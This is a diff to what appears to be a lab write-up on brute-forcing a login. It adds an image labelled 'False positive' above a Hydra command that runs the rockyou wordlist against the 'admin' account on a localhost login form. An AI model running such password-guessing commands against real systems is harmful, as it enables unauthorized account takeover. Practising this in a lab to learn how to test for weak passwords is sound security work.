@@ -8,6 +8,8 @@ Attempt a dictionary-based brute-force against the `admin` account using Hydra a
 
 ## What I ran
 
+![False positive](./bf-false.webp)
+
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form \
 "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
